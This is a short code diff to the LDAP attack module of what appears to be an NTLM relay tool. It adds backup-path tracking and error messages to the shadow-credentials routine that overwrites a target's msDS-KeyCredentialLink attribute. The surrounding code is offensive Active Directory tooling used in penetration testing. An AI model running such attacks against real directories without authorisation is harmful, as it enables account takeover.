@@ -330,6 +330,8 @@ class LDAPAttack(ProtocolAttack):
         try:
             existing_values = results['raw_attributes'].get('msDS-KeyCredentialLink', [])
             LOG.info('Found %d existing KeyCredential(s) on target object', len(existing_values))
+            cleared_existing_values = False
+            backup_path = None
             if self.config.ShadowCredentialsReplace:
                 if len(existing_values) > 0:
                     backup_count, backup_path = shadow_credentials.backupKeyCredentialsToJSON(
@@ -341,6 +343,7 @@ class LDAPAttack(ProtocolAttack):
                     if self.client.result['result'] != 0:
                         self._handleShadowCredentialModifyError()
                         return
+                    cleared_existing_values = True
 
                 new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target_dn)]
             else:
@@ -377,6 +380,17 @@ class LDAPAttack(ProtocolAttack):
                     delegatePerformed.append(currentShadowCredentialsTarget)
             else:
                 self._handleShadowCredentialModifyError()
+                if cleared_existing_values:
+                    LOG.error(
+                        'The existing KeyCredentials were cleared, but the new credential could not be set. '
+                        'The target attribute is now empty. Recovery data is available in %s',
+                        backup_path,
+                    )
+                elif existing_values and not self.config.ShadowCredentialsReplace:
+                    LOG.error(
+                        'The target already contains KeyCredentials. If replacing them is intended, '
+                        'retry with --shadow-replace to back up and clear the existing values first.'
+                    )
         except IndexError:
             LOG.info('Attribute msDS-KeyCredentialLink does not exist')
         return
